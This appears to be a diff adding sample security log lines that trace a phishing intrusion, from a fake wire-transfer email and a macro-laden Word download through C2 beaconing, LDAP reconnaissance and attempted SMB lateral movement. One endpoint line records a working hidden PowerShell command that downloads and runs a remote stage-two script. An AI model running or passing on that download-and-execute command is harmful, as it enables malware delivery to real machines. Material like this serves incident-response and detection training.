@@ -1,0 +1,9 @@
+2026-04-18 09:02:14 INFO  mail-gateway SMTP ACCEPT from=accounting-payroll@contoso-fake.com to=jsmith@company.com subject="Updated Wire Transfer Instructions Q2" size=42810
+2026-04-18 09:02:31 INFO  mail-gateway URL extracted: http://contoso-fake.com/invoice/view?id=8842&token=a9f3
+2026-04-18 09:03:44 WARN  proxy ALLOW CONNECT jsmith-pc -> contoso-fake.com:443 [UNCATEGORIZED]
+2026-04-18 09:04:02 INFO  proxy HTTP GET http://contoso-fake.com/invoice/view?id=8842&token=a9f3 200 OK content-type=application/msword
+2026-04-18 09:04:08 WARN  endpoint jsmith-pc MACRO EXECUTION winword.exe -> powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.52/stage2.ps1')"
+2026-04-18 09:04:19 ERROR endpoint jsmith-pc AV DETECTION Trojan.PowerShell.Agent BLOCKED path=C:\Users\jsmith\AppData\Local\Temp\wscript_helper.ps1
+2026-04-18 09:04:22 WARN  endpoint jsmith-pc NETWORK BEACON outbound to 185.220.101.52:443 (C2 candidate) every 60s
+2026-04-18 09:11:07 WARN  dc-01 LDAP QUERY excessive — 1,240 objects enumerated by jsmith-pc within 4 minutes (possible recon)
+2026-04-18 09:14:53 INFO  siem ALERT Lateral movement attempt: jsmith-pc -> FINANCE-SERVER-03 via SMB, account jsmith
